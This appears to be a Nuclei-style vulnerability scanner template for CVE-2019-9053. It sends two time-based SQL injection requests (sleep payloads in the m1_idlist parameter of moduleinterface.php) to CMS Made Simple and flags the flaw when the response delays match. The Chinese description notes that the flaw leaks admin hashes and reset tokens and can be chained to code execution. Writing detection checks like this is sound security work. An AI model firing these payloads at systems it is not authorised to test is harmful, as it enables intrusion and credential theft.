id: cms-made-simple-sqli
info:
  name: "CMS Made Simple 前台接口 SQL 注入漏洞"
  author: 0dayPoc
  severity: high
  description: |-
    CMS Made Simple 2.2.9.1 以前版本的前台接口存在未经验证的 SQL 注入缺陷，攻击者可通过构造恶意请求提取管理员密码哈希或获取密码重置令牌。该漏洞可与后台的服务器端模板注入漏洞（CVE-2021-26120）形成利用链，最终实现任意代码执行。
  reference:
  - CVE-2019-9053
  tags: CMS Made Simple
http:
- raw:
  - |
    GET /moduleinterface.php?mact=News,m1_,default,0&m1_idlist=a,b,1,5))+and+(select+sleep(5))--+ HTTP/1.1
    Host: {{Hostname}}
    Accept: */*
    Accept-Encoding: gzip, deflate
    Connection: close
  - |
    GET /moduleinterface.php?mact=News,m1_,default,0&m1_idlist=a,b,1,5))+and+(select+sleep(8))--+ HTTP/1.1
    Host: {{Hostname}}
    Accept: */*
    Accept-Encoding: gzip, deflate
    Connection: close
  matchers:
  - type: dsl
    dsl:
    - duration_1>=5 && duration_1<=6
    - duration_2>=8 && duration_2<=9
    condition: and
